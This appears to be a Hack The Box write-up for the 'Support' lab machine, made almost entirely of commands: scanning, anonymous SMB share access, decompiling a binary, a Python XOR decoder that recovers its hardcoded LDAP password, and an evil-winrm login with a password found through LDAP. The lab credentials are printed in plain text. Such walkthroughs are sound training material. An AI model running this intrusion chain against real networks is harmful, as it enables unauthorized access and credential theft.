```
nmap -sS -sC -sV -T5 -Pn 10.10.11.174
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c513fb68-50d1-41b4-8934-27824a4ed58e)

```
smbclient -L \\\\10.10.11.174\\
smbclient \\\\10.10.11.174\\support-tools
```
![image](https://github.com/regarmulia/HTB/assets/33616880/71fa0c96-fe56-4321-851b-d46f6b8f8795)

```
unzip UserInfo.exe.zip
cat UserInfo.exe.config
```
![image](https://github.com/regarmulia/HTB/assets/33616880/98094d02-a256-46d6-9bf1-f38c289f4c73)


```
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-arm64
sudo ./ILSpy
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c25352b4-a0c5-4d1c-bd87-6b71045eee0f)

```
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
        res += chr(e ^ k ^ key2)

print(res)
```
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2b3ae44c-1a69-4e82-92c3-0ffaac79088c)


```
wget https://dlcdn.apache.org/directory/studio/2.0.0.v20210717-M17/ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
tar -xf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
./ApacheDirectoryStudio
Ironside47pleasure40Watchful
```
![image](https://github.com/regarmulia/HTB/assets/33616880/875c3cc4-807f-429a-8bb9-8b8e08ac724e)


```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f0f57e9e-b8fc-4d4d-b8ac-3a129655c56f)

